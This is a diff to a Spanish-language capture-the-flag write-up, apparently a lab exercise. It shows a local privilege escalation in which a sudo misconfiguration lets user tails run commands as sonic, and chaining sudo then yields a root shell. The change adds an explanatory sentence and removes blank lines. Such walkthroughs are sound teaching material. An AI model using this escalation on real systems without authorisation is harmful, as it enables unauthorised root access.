@@ -198,13 +198,13 @@ Una vez dentro de la máquina víctima, vamos a intentar listar todos los privil
 tails@e68f5d080656:~$ sudo -l
 User tails may run the following commands on e68f5d080656:
     (sonic) NOPASSWD: ALL
+```
+Sabiendo que podemos invocar al usuario *sonic* vía sudo podemos ejecutar directamente una bash como root.
+```
 tails@e68f5d080656:~$ sudo -u sonic sudo /bin/bash
 root@e68f5d080656:/home/tails# whoami
 root
 root@e68f5d080656:/home/tails# 
 ```
-
-
-
 🥳CONSEGUIDO, SOMOS ROOT🥳
 
